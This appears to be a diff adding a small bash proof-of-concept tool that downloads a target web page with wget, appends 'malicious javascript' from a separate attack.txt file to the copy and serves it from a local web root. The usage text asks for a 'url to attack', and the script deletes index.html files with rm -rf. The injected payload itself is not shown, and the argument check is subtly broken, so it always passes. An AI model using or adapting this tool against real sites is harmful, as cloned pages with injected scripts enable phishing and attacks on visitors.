@@ -1,0 +1,58 @@
+#!/bin/bash
+clear
+cat style
+echo -e "\n"
+echo -e "Designed by: ${GREEN} @hippi3c0w ${NC}"
+echo -e "\n"
+rm -rf /var/www/html/svg/index.html
+rm -rf index.html*
+#Color variables
+BLACK='\033[0;30m'
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+ORANGE='\033[0;33m'
+PURPLE='\033[0;34m'
+CYAN='\033[0;35m'
+LIGHTGRAY='\033[0;36m'
+NC='\033[0m'
+DARKGRAY='\033[1;30m'
+LIGHTRED='\033[1;31m'
+LIGHTGREEN='\033[1;32m'
+LIGHTORANGE='\033[1;33m'
+LIGHTPURPLE='\033[1;34m'
+LIGHTCYAN='\033[1;35m'
+
+
+function usage(){
+echo "Usage: "
+echo " --url                            -                               url to attack"
+echo " --file                           -                               file with the urls to attack"
+}
+
+#if nothing
+if [[ $# -eq 0 ]];then
+usage
+fi
+
+
+#url
+if [[ $1=="--url" ]];then
+
+        #check if we have a url
+        if [[  -z "$2"  ]]; then
+                echo "no url specified"
+        else
+                echo -e "[${GREEN}+${NC}] downloading web-->$2"
+                sleep 2
+                wget  $2
+                delete=`cat svg.conf |cut -d " " -f2`
+                echo -e "[${GREEN}+${NC}] Injecting malicious javascript in web-->$2"
+                sleep 2
+                sed -i 's/"$delete"/ /g' index.html*
+                cat attack.txt >> index.html*
+                echo "</html>" >> index.html*
+                echo -e "[${GREEN}+${NC}] moving the poc file to your localhost. Type localhost/svg in your browser to test it"
+                mv index.html /var/www/html/svg/
+        fi # if check url
+
+fi #if $1
